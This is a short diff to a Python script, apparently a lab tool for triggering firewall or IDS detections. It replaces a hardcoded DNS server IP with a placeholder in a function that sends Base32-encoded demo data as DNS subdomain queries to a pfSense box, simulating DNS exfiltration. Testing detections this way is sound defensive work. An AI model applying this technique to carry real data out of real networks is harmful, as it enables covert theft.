@@ -25,7 +25,7 @@ def trigger_path_traversal(target_ip=TARGET_IP):
         return False
 
 
-def trigger_dns_exfiltration(dns_server="10.1.4.1"):
+def trigger_dns_exfiltration(dns_server="insert-your-dns-server-ip-here"):
     """Sends a raw Base32-encoded subdomain DNS query directly to pfSense over UDP 53."""
     secret_payload = "CONFIDENTIAL_DEMO_TEST_DATA"
     encoded_str = base64.b32encode(secret_payload.encode()).decode().rstrip("=")[:20]
